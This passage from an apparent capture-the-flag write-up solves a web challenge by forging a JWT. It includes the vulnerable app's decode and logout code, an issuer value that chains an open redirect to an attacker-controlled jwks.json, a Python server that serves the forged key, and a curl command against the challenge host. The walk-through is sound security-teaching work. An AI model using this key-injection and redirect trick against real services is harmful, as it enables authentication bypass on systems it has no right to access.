<p><br />It’s pretty straightforward: Create an HTTP request to the URL retrieved earlier and retrieve the jwks.json contents and get the <code class="language-plaintext highlighter-rouge">x5c</code> value. <code class="language-plaintext highlighter-rouge">jwks.json</code> is <em>The JSON Web Key Set (JWKS) is a set of keys containing the public keys used to verify any JSON Web Token (JWT) issued by the Authorization Server and signed using the RS256 signing algorithm. When creating applications and APIs in Auth0, two algorithms are supported for signing JWTs : RS256 and HS256.</em> - auth0.com
<br />Basically the public key is retrieved through the <code class="language-plaintext highlighter-rouge">jwks.json</code> and verify and decode the retrieved token from us. Therefore, the server has to use our public key in order to verify our payload. This also means that it has to connect to our server through the <code class="language-plaintext highlighter-rouge">issuer</code>. With this in mind, we can form the following JWT below:
<br /><img src="images/getthesecretflag_3.png" alt="lol it didn't load" />
<br />Going back up again at <code class="language-plaintext highlighter-rouge">authorize_request()</code>, after the verification and decoding of our JWT, it tries to find “user” key from the payload and checks if it’s a valid user i.e. it’s equal to “motoh4ck3r”. 
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pubkey</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="n">valid_alg</span><span class="p">])</span>
        <span class="k">if</span> <span class="s">"user"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">decoded_token</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT user is not configured."</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div>
<p><br />We can form the JWT again below. We now add the “user” key and “motoh4cker” corresponding value.
<br /><img src="images/getthesecretflag_4.png" alt="lol it didn't load" />
<br />If everything is fine, it should work and the flag should be printed. We used the following command below:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://149.28.150.153//api/secret_flag <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s1">'aa=aaa'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-H</span> <span class="s1">'Authorization: Bearer &lt;JWT generated&gt;'</span> <span class="nt">-vvv</span>

</code></pre></div></div>
<p><br />Unfortunately, it didn’t print the flag and it stated that the issuer should be <code class="language-plaintext highlighter-rouge">localhost:80</code>.
<br /><img src="images/getthesecretflag_5.png" alt="lol it didn't load" />
<br />This is very bad since we can’t control the <code class="language-plaintext highlighter-rouge">jwks.json</code> of localhost. Getting the private key for the target server’s jwks.json is also out of the question. After a bit of analysis in the provided source codes, turns out there is also a open redirect vulnerability on the app.py through the <code class="language-plaintext highlighter-rouge">logout()</code> function:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">session</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
    <span class="n">redirect_uri</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'redirect'</span><span class="p">,</span> <span class="n">url_for</span><span class="p">(</span><span class="s">'home'</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">redirect_uri</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div>
<p><br />We can set <code class="language-plaintext highlighter-rouge">redirect</code> to our host jwks.json. The final <code class="language-plaintext highlighter-rouge">issuer</code> value is <code class="language-plaintext highlighter-rouge">http://localhost:80/logout?redirect=http://&lt;our_host&gt;:8000/jwks.json</code>. This tricks the issuer check since the initial URL technically points to itself (localhost) but the HTTP request it’s doing follows redirect to our host so this is perfect for our case.
<br />We can now edit the JWT like below:
<br /><img src="images/getthesecretflag_6.png" alt="lol it didn't load" />
<br />On our server, we setup a simple HTTP server in python getting jwks.json and returning it as json. The following code is used below:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
# Reflects the requests with dummy responses from HTTP methods GET, POST, PUT, and DELETE
# Written by Tushar Dwivedi (2017)
</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
<span class="kn">from</span> <span class="nn">optparse</span> <span class="kn">import</span> <span class="n">OptionParser</span>

<span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">request_path</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">path</span>

        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">----- Request Start -----&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"request_path :"</span><span class="p">,</span> <span class="n">request_path</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"self.headers :"</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"&lt;----- Request End -----</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">"Set-Cookie"</span><span class="p">,</span> <span class="s">"foo=bar"</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">"content-type"</span><span class="p">,</span> <span class="s">"application/json"</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>    <span class="s">"keys"</span><span class="p">:</span> <span class="p">[</span>        <span class="p">{</span>            <span class="s">"alg"</span><span class="p">:</span> <span class="s">"RS256"</span><span class="p">,</span>            <span class="s">"x5c"</span><span class="p">:</span> <span class="p">[</span>                <span class="s">"MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwJRlDqfdpsAYr1FqzBtdM8amhWSlxReUPqin67zPIczaWWV2rcqDuwwNwLlt2px5E/nhpu7M1LpLQf29jnlMuG/G/uBKmxRteysv/EdXRrDDFmGDNDVsT+Nt9DIfWi2yQv/ha+LwRsIz+PyS2PdsNTGqF5Fn4yvP5q7KlIgfdV6g8cGnmRQxOxBuDvwGP5Kel3sNHOq/LU9z2xSUtu/ip1BuhuI1bJd7t7uo3mtHjeSEuoldsgVAHgwvU7Q3CvlIr8qvHuZ3X646BVCm4ufTAzfYtlBLgHi4A1T9jxt99MAQMlsVe5/cNgq0fFhDq86uWY/UGh+qrOHOL/8wHr/1wUKW4Xelqhm0h8KSad112HxYMX9287hbs6sXnZ72jtcMhA4dL0w2HQ6ZQ3Lv8XNA+B5RWx5wJPFsCDFnDfEQxoDG2V6JMK1B0SOiHDIEuF6hc3ebq3oYOA9clqZRiTcDPlCdl0FftLOu4LqFCdt+h/F+HlvkzBNlrxnz9XBVghgA4LrTYcX2TRVtqjOMfXEPKgu8f5Zqy1ZmH4aQ1AybVvd40ZdlsEZtK1cmy2PUTdopmzrxnkrVvkb8eC4M2OSNNyjzwKL7OyllCEP43Hp+sRy6lEIWajAlEosCh1iLVwMH9EIsc/laBM9/o7VlgocoSIOHKsx+ZCAXnPDFuiTj32sCAwEAAQ=="</span>            <span class="p">]</span>        <span class="p">}</span>    <span class="p">]}).</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">port</span> <span class="o">=</span> <span class="mi">8000</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Listening on localhost:%s'</span> <span class="o">%</span> <span class="n">port</span><span class="p">)</span>
    <span class="n">server</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="s">''</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">RequestHandler</span><span class="p">)</span>
    <span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">OptionParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">usage</span> <span class="o">=</span> <span class="p">(</span><span class="s">"Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data</span><span class="se">\n</span><span class="s">"</span>
                    <span class="s">"Run:</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
    <span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">main</span><span class="p">()</span>

</code></pre></div></div>
<p><br />And then we ran it, waiting for the target server to connect:
<br /><img src="images/getthesecretflag_7.png" alt="lol it didn't load" />
<br />Final cURL execution with the most updated JWT returns the flag:
<br /><img src="images/getthesecretflag_8.png" alt="lol it didn't load" /></p>


    </main><footer>
  
</footer>
</div>
  </body>
</html>
